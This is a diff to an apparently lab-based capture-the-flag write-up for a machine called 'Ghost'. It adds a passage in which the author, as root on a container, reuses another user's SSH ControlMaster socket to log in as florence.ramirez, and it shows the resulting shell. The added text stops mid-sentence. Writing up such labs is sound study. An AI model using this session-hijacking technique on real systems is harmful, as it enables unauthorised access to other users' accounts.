@@ -625,7 +625,7 @@ Ill send the request
 
 ![](Pasted%20image%2020260827190732.png)
 
-I now have a root shell on the ubuntu server
+I now have a root shell on the container running on the ubuntu server
 
 # Enumeration as root on the container
 
@@ -640,8 +640,12 @@ srw------- 1 root root    0 Aug 27 15:51 florence.ramirez@ghost.htb@dev-workstat
 I have found a controlmaster socket file for a user called `florence.ramirez`
 
 ```python
-
+root@36b733906694:~# ssh -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb
+Last login: Thu Feb  1 23:58:45 2024 from 172.18.0.1
+florence.ramirez@LINUX-DEV-WS01:~$
 ```
+
+I can use this to login to the machine, now escaping the 
 
 
 
